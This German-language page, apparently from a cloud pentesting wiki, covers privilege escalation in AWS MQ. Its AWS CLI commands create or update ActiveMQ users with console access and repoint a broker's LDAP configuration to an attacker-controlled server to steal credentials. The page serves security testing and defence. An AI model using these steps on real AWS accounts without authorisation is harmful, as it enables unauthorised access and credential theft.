# AWS - MQ Privesc

{{#include ../../../banners/hacktricks-training.md}}

## MQ

Für weitere Informationen über MQ siehe:

{{#ref}}
../aws-services/aws-mq-enum.md
{{#endref}}

### `mq:ListBrokers`, `mq:CreateUser`

Mit diesen Berechtigungen kannst du **einen neuen Benutzer in einem ActiveMQ-Broker erstellen** (dies funktioniert nicht in RabbitMQ):
```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```
**Potenzielle Auswirkungen:** Zugriff auf sensible Informationen durch Navigation in ActiveMQ

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

Mit diesen Berechtigungen können Sie **einen neuen Benutzer in einem ActiveMQ-Broker erstellen** (dies funktioniert nicht in RabbitMQ):
```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```
**Potenzielle Auswirkungen:** Zugriff auf sensible Informationen durch Navigation in ActiveMQ

### `mq:ListBrokers`, `mq:UpdateBroker`

Wenn ein Broker **LDAP** zur Autorisierung mit **ActiveMQ** verwendet, ist es möglich, die **Konfiguration** des verwendeten LDAP-Servers auf **einen, der vom Angreifer kontrolliert wird**, zu **ändern**. Auf diese Weise kann der Angreifer **alle Anmeldeinformationen stehlen, die über LDAP gesendet werden**.
```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```
Wenn Sie irgendwie die ursprünglichen Anmeldeinformationen finden könnten, die von ActiveMQ verwendet werden, könnten Sie einen MitM durchführen, die Anmeldeinformationen stehlen, sie auf dem ursprünglichen Server verwenden und die Antwort senden (vielleicht könnten Sie dies einfach tun, indem Sie die gestohlenen Anmeldeinformationen wiederverwenden).

**Potenzielle Auswirkungen:** ActiveMQ-Anmeldeinformationen stehlen

{{#include ../../../banners/hacktricks-training.md}}
